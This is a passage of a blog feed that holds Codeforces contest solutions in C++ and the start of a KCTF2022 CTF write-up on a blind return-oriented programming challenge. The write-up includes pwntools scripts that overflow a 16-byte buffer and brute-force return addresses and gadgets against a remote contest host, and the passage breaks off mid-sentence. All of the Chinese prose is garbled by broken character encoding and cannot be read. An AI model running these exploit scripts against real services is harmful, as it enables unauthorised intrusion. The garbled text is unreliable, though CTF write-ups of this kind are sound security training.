å–æ¨¡å¾—åˆ°çš„ä¸‹æ ‡å°±æ˜¯ç¬¬ä¸€å¼ ç‰Œçš„ä½ç½®ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x,op,ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=x;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        ans+=op;</span><br><span class="line">        ans%=n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[ans+<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Double-Sort"><a href="#C-Double-Sort" class="headerlink" title="C. Double Sort"></a>C. Double Sort</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä¸¤ä¸ªåºåˆ—ï¼Œæ¯æ¬¡ä¸€èµ·äº¤æ¢ï¼Œé—®æœ€åèƒ½å¦äº¤æ¢æˆéƒ½ä¸é€’å‡ï¼Œä¸”è‹¥èƒ½åˆ™è¾“å‡ºäº¤æ¢æ¬¡æ•°æœ€å°‘çš„æ–¹æ¡ˆã€‚æˆ‘ä»¬ç›´æ¥å®šä¹‰ç»“æ„ä½“å­˜å‚¨ä¸¤ä¸ªåºåˆ—çš„å€¼å†é‡è½½å°äºå·ï¼Œè®©å®ƒä¸¥æ ¼æŒ‰ <code>a</code> é€’å¢ï¼Œç›¸ç­‰çš„æƒ…å†µæŒ‰ <code>b</code>é€’å¢ï¼Œå› ä¸ºäº¤æ¢æ¬¡æ•°æœ€å°‘ï¼Œä¸éš¾æƒ³åˆ°ç”¨é€‰æ‹©æ’åºå¯ä»¥è¾¾åˆ°äº¤æ¢æ¬¡æ•°æœ€å°‘çš„ç›®çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å…ˆæ’ä¸ªåºï¼Œç„¶ååˆ¤æ–­ <code>b</code> çš„å€¼æ˜¯å¦ä¸é€’å‡å°±å¯ä»¥äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int a[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> A &amp;q)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==q.a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b&lt;q.b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a&lt;q.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;a[maxn]; </span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;().<span class="built_in">swap</span>(ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> idx=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[idx])&#123;</span><br><span class="line">                idx=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx!=i)&#123;</span><br><span class="line">            ans.<span class="built_in">push</span>(&#123;idx,i&#125;);</span><br><span class="line">            <span class="built_in">swap</span>(a[i],a[idx]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i<span class="number">-1</span>].b&gt;a[i].b)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">while</span>(ans.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=ans.<span class="built_in">front</span>();</span><br><span class="line">        ans.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,x.first,x.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ï¼Œå°±æ˜¯è¯´å¯¹ä¸€ä¸ªæ•°è¿›è¡Œæ“ä½œï¼Œæ¯æ¬¡å¯ä»¥æŠŠè¿™ä¸ªæ•°çš„åè¿›åˆ¶æŸä¸€ä½ä½œä¸ºä¹˜æ•°ä¹˜è¿™ä¸ªæ•°ï¼Œå³ä¸ºä¸€æ¬¡æ“ä½œã€‚é—®ä½ æœ€å°æ“ä½œæ¬¡æ•°ä½¿è¿™ä¸ªæ•°å˜æˆåè¿›åˆ¶ <code>n</code> ä½ã€‚</p><p>è¿™ä¸ªé¢˜çš„è¯å°±ç›´æ¥æ— è„‘å¹¿æœå°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int unsigned long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> target=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">40</span>;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;now,<span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">bool</span> used[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="built_in">memset</span>(used,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(used));</span><br><span class="line">        <span class="keyword">int</span> num=q.<span class="built_in">front</span>().first;</span><br><span class="line">        <span class="keyword">int</span> step=q.<span class="built_in">front</span>().second;</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> m=num;</span><br><span class="line">        <span class="keyword">if</span>(num&gt;=target)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%lld\n&quot;,cnt);</span></span><br><span class="line">            <span class="keyword">return</span> step;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(m)&#123;</span><br><span class="line">            <span class="keyword">int</span> p=m%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(p!=<span class="number">0</span>&amp;&amp;p!=<span class="number">1</span>&amp;&amp;!used[p])&#123;</span><br><span class="line">                used[p]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(ma[p*num]==<span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">                ma[p*num]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;p*num,step+<span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            m/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    target=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        target*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">bfs</span>(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="In-The-End"><a href="#In-The-End" class="headerlink" title="In The End"></a>In The End</h2><p>è¿™æ³¢åº”è¯¥æ˜¯æ‰‹é€Ÿåœºï¼Œæ‰‹é€Ÿå¿«å°±æ˜¯ä¸Šå¤§åˆ†ï¼Œç»§ä¸Šä¸€æ¬¡ç½šæ—¶çˆ†ç‚¸ä¹‹åè¿™åœºæ²¡æœ‰ä¸€ç‚¹ç½šæ—¶ï¼ŒæŒºå¥½çš„ï¼Œåˆšåˆšæ‰è“ä¸€ä¸‹ç»™åŠ å›æ¥äº†ã€‚</p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/5.png" alt="5"></p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/6.png" alt="6"></p><p>100åˆ†ï¼</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™æ³¢ &lt;code&gt;div2&lt;/code&gt; ä¸Šå¤§åˆ†ï¼Œå†™æ³¢é¢˜è§£ã€‚&lt;/p&gt;
&lt;p&gt;å®å†µå½•å±&lt;a href=&quot;https://www.bilibili.com/video/BV1RS4y1B7g3&quot;&gt;åœ¨è¿™&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>KCTF2022æ˜¥å­£èµ› ç¬¬å…­é¢˜ writeup</title>
    <link href="http://example.com/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/"/>
    <id>http://example.com/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/</id>
    <published>2022-05-23T04:00:00.000Z</published>
    <updated>2022-05-23T09:30:23.608Z</updated>
    
    <content type="html"><![CDATA[<p>KCTF2022æ˜¥å­£èµ› ç¬¬å…­é¢˜ writeup</p><span id="more"></span><p>è¿™é¢˜ï¼ŒBROPæç¤ºç»™çš„å¾ˆæ˜æ˜¾ï¼Œæ‰€ä»¥å°±æ˜¯ç›²æ‰“ï¼Œä¸ç®¡æ€ä¹ˆè¯´å…ˆé—®(bao)å€™(da)ä¸€ä¸‹å‡ºé¢˜äººã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ä¸€å¼€å§‹ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œå°±å…ˆç¡®å®šä¸€ä¸‹ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å…ˆæµ‹è¯•ä¸€ä¸‹ç¼“å†²åŒºçš„é•¿åº¦ï¼Œæœ€åå‘ç°ç¼“å†²åŒºé•¿åº¦ä¸º0x10ã€‚</p><p>æˆ‘ä»¬å…ˆæ‰§è¡Œä¸€éæ­£å¸¸æµç¨‹ï¼Œå¤§æ¦‚å°±æ˜¯ï¼š</p><ol><li>è¾“å‡ºä¸€å¥è¯</li><li>è¾“å…¥</li><li>è¾“å‡ºä¸€å¥è¯</li></ol><p>å½“å­˜åœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œæœ€åä¸€å¥è¯è¾“å‡ºä¸å‡ºæ¥ï¼Œå› æ­¤å¯ä»¥æ–­å®šï¼Œæº¢å‡ºæ˜¯å‘ç”Ÿåœ¨è‡ªå·±å®šä¹‰çš„å‡½æ•°çš„ã€‚å¤§æ¦‚å†™ä¸€ä¸‹ä¼ªä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void func()&#123;</span><br><span class="line">char buf[16];</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">puts(&quot;hacker, TNT!&quot;);</span><br><span class="line">func();</span><br><span class="line">puts(&quot;TNT TNT!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¾“å‡ºç¬¬ä¸€å¥è¯çš„è¯­å¥å¯èƒ½ä¹Ÿåœ¨ <code>func</code> é‡Œé¢ï¼Œä½†æ˜¯ä¸å½±å“ï¼Œæˆ‘ä»¬å…ˆçˆ†ç ´ç¬¬ä¸€ä¸ªå­—èŠ‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p8(i)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/1.png" alt="1"></p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/2.png" alt="2"></p><p>å¯ä»¥å‘ç°ï¼Œå½“è¦†ç›–ä¸€ä¸ª <code>\xb0</code> å­—èŠ‚çš„æ—¶å€™ï¼Œç¨‹åºé‡æ–°æ‰§è¡Œäº†ä¸€é <code>main</code> å‡½æ•°ï¼Œå½“è¦†ç›–ä¸€ä¸ª <code>\xce</code> å­—èŠ‚çš„æ—¶å€™ï¼Œç¨‹åºæ‰§è¡Œæ­£å¸¸æµç¨‹é€€å‡ºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li><code>main</code> å‡½æ•°çš„ä½ä½ä¸º <code>0xb0</code></li><li><code>func</code> å‡½æ•°çš„è¿”å›åœ°å€ä¸º <code>0xce</code></li></ul><p>è¿™é‡Œå…¶å®å¯ä»¥ç¡®å®šè¾“å‡ºç¬¬ä¸€å¥è¯çš„å‡½æ•°åœ¨ <code>main</code> å½“ä¸­äº†ï¼Œå› ä¸ºå¦‚æœåœ¨ <code>func</code> å‡½æ•°å½“ä¸­ï¼Œé‚£ä¹ˆä¸€å®šä¼šå­˜åœ¨ä¸¤ä¸ªåœ°å€ä½¿å¾—ç¨‹åºé‡æ–°æ‰§è¡Œä¸€éæµç¨‹ï¼Œé‚£å°±æ˜¯æ”¹æˆäº† <code>func</code> å‡½æ•°å’Œ <code>main</code> å‡½æ•°çš„åœ°å€éƒ½ä¼šè¿™æ ·ï¼Œæ²¡æœ‰å°±è¯´æ˜ç¬¬ä¸€å¥è¯è¾“å‡ºä¸åœ¨ <code>main</code> å½“ä¸­ã€‚</p><p>ç„¶åå†å‹‡æ•¢åœ°ä¸€è¯•ï¼ŒçŒœæµ‹å®ƒçš„åœ°å€ä¸º <code>0x4000b0</code>ï¼Œç»“æœå‘ç°ä¹Ÿæ˜¯é‡æ–°æ‰§è¡Œäº† <code>main</code> å‡½æ•°ï¼Œè¿™ä¹Ÿé—´æ¥æ–­å®šäº†è¿™ä¸ªç¨‹åºæ˜¯ <code>64</code> ä½çš„ã€‚ä¸Šé¢æ¨å‡ºçš„ä¸¤ä¸ªåœ°å€ä¹Ÿç¡®å®šäº†ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥å°è¯•å–å¯»æ‰¾ <code>gadget</code> äº†ï¼Œæˆ‘ä»¬è¦å¯»æ‰¾çš„é¦–è¦ <code>gadget</code> è‡ªç„¶å°±æ˜¯ <code>pop rdi ret</code> äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b0</span></span><br><span class="line">ret=<span class="number">0x4000ce</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x401900</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(ret)+p64(main)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ª <code>payload</code> å½“ä¸­ï¼Œå¯ä»¥å‘ç°ï¼Œå¦‚æœå¯»æ‰¾çš„ 